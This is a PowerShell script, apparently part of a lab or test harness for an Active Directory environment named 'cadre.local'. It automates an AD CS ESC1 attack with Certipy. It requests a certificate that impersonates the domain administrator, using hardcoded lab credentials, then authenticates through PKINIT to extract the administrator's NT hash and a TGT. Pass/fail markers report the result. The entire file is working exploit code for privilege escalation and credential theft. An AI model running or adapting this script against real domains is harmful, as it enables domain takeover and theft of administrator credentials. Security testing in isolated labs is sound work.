[CmdletBinding()]
param()
$ErrorActionPreference = "Continue"
function Find-Tool {
    param([string[]]$Paths)
    foreach ($p in $Paths) {
        if ([string]::IsNullOrWhiteSpace($p)) { continue }
        if (Test-Path -LiteralPath $p -ErrorAction SilentlyContinue) { return $p }
    }
    return $null
}
$certpy = Find-Tool @(
    "C:\Tools\cadre-attack\certipy.exe",
    "C:\Program Files\Python312\Scripts\certipy.exe",
    "C:\Program Files\Python311\Scripts\certipy.exe"
)
$py = Find-Tool @(
    "C:\Program Files\Python312\python.exe",
    "C:\Program Files\Python311\python.exe",
    "C:\Python312\python.exe"
)
if (-not $certpy -and -not $py) {
    Write-Output "T_UNPAC_CERTIPY_MISSING"
    exit 1
}
Set-Location C:\Tools\cadre-attack
function Invoke-Certipy {
    param([string[]]$CertipyArgs)
    if ($certpy) {
        Write-Output ("CERTIPY=" + $certpy)
        & $certpy @CertipyArgs 2>&1 | Out-String
    } else {
        Write-Output ("PYTHON=" + $py)
        & $py -m certipy @CertipyArgs 2>&1 | Out-String
    }
}
$pfx = Find-Tool @(
    "C:\Tools\cadre-attack\unpac-admin.pfx",
    "C:\Tools\cadre-attack\administrator.pfx"
)
if (-not $pfx) {
    Write-Output "=== certipy req CADRE-ESC1 (for UnPAC) ==="
    $req = Invoke-Certipy @(
        "req",
        "-u", "chief_command@cadre.local",
        "-p", "C0mm@nd_Ch1ef!",
        "-dc-ip", "192.168.77.10",
        "-ca", "cadre-CA",
        "-target", "dc01.cadre.local",
        "-template", "CADRE-ESC1",
        "-upn", "administrator@cadre.local",
        "-sid", "S-1-5-21-277764030-1371232215-1561074416-500",
        "-out", "unpac-admin"
    )
    Write-Output $req
    $pfx = Find-Tool @("C:\Tools\cadre-attack\unpac-admin.pfx")
}
if (-not $pfx) { Write-Output "T_UNPAC_FAIL: no pfx"; exit 1 }
Write-Output ("PFX=" + $pfx)
Write-Output "=== certipy auth (PKINIT -> UnPAC NT hash) ==="
$auth = Invoke-Certipy @(
    "auth",
    "-pfx", $pfx,
    "-dc-ip", "192.168.77.10",
    "-domain", "cadre.local"
)
Write-Output $auth
if ($auth -notmatch "Hash NTLM|Got TGT|NT hash") {
    Write-Output "T_UNPAC_FAIL: auth output has no hash/TGT"
    exit 1
}
Write-Output "T_UNPAC_OK"
